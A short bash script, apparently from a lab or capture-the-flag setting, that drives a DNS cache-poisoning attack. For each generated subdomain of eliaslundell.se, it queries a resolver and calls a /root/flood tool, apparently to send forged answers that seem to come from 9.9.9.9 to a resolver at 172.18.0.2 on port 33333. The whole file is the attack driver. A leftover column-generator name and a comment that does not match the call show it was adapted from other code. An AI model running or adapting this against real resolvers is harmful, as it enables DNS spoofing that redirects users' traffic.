#!/bin/bash

generate_columns_while() {
    local max_length=${1:-2}  # Maximum length of strings
    local queue=({a..z})

    while ((${#queue[@]})); do
        # Pop first element
        local current=${queue[0]}
        queue=("${queue[@]:1}")

        dig @dns_server $current.eliaslundell.se &
        /root/flood 9.9.9.9 53 172.18.0.2 33333 $current.eliaslundell.se
        read -p "Press enter to continue"

        # If length allows, append next level combinations
        if (( ${#current} < max_length )); then
            for c in {a..z}; do
                queue+=("$current$c")
            done
        fi
    done
}

# Usage: generate columns up to length 2
generate_columns_while 3
